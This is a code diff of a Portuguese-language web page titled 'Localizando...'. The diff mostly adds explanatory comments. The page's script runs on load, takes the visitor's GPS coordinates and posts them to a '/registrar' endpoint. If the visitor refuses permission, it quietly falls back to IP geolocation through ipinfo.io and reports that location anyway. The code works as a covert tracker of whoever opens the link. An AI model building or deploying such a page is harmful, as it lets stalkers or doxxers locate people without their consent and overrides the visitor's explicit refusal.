@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
+    <meta charset="UTF-8">
     <title>Localizando...</title>
-    <meta charset="utf-8">
     <script>
         function enviarLocalizacao(lat, lon, precisa) {
             fetch('/registrar', {
@@ -18,27 +18,31 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
+                        // Se o usuário permitir, usamos as coordenadas GPS
                         enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
                     },
                     erro => {
-                        // Se não permitir, tentar via IP
-                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')
+                        // Se o usuário não permitir, tentamos buscar via IP
+                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')  // Substitua pelo seu token real
                             .then(res => res.json())
                             .then(d => {
                                 const [lat, lon] = d.loc.split(',');
                                 enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
-                            }).catch(() => {
+                            })
+                            .catch(() => {
+                                // Caso não consiga pegar a localização, enviaremos (0,0) como fallback
                                 enviarLocalizacao(0.0, 0.0, false);
                             });
                     },
-                    { timeout: 5000 }
+                    { timeout: 5000 } // Tempo de timeout para pegar a localização
                 );
             } else {
+                // Caso o navegador não suporte geolocalização
                 enviarLocalizacao(0.0, 0.0, false);
             }
         }
 
-        window.onload = obterLocalizacao;
+        window.onload = obterLocalizacao; // Inicia a coleta da localização assim que a página carregar
     </script>
 </head>
 <body>
